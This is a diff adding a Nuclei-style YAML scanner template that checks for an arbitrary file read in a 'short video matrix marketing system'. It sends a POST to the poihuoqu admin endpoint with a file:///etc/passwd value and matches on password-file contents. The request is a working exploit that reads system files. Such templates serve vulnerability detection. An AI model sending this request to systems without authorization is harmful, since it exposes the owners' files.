@@ -1,0 +1,33 @@
+id: poc-yaml-short-video-matrix-poihuoqu-anyfile-read
+info:
+  name: 短视频矩阵营销系统 poihuoqu 任意文件读取漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+http:
+  - raw:
+      - |
+        POST /index.php/admin/Userinfo/poihuoqu HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        poi=file:///etc/passwd
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "root:"
+          - "/bin"
+        part: body
+      - type: word
+        words:
+          - "application/json"
+        part: header
+      - type: word
+        words:
+          - "<"
+        part: body
+        negative: true
